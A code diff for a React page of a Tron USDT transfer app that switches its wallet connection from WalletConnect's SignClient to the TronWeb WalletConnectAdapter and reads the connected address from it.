@@ -3,6 +3,7 @@ import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 import SignClient from "@walletconnect/sign-client";
+import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapters";
 
 declare global {
   interface Window {
@@ -16,15 +17,7 @@ declare global {
     }) => void;
     setTransactionStatus?: (status: "idle" | "processing" | "success") => void;
     updateWalletAddress?: (address: string) => void;
-    tronWeb?: {
-      defaultAddress: { base58: string };
-      contract: (abi: unknown[], address: string) => Promise<unknown>;
-      trx: { getBalance: (address: string) => Promise<number>; sign: (transaction: unknown) => Promise<unknown> };
-      toBigNumber: (value: string) => unknown;
-    };
-    tronLink?: {
-      request: (args: { method: string }) => Promise<{ code: number }>;
-    };
+    
   }
 }
 
@@ -43,22 +36,22 @@ export default function Index() {
   useEffect(() => {
     async function initWC() {
       try {
-        const client = await SignClient.init({
-          projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
-          metadata: {
-            name: "USDT Transfer",
-            description: "Secure USDT Transfer on Tron",
-            url: window.location.origin,
-            icons: [],
+        const adapter = new WalletConnectAdapter({
+          network: "Mainnet",
+          options: {
+            relayUrl: "wss://relay.walletconnect.org",
+            projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
+            metadata: {
+              name: "USDT Transfer",
+              description: "Secure USDT Transfer on Tron",
+              url: window.location.origin,
+              icons: [],
+            },
           },
         });
-        wcClientRef.current = client;
-        const sessions = client.session.getAll();
-        if (sessions.length > 0) {
-          wcSessionRef.current = sessions[sessions.length - 1];
-          const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
-          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
-          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
+        wcClientRef.current = adapter;
+        if (adapter.address) {
+          userAddressRef.current = adapter.address;
         }
       } catch(e) { console.error("WC init:", e); }
     }
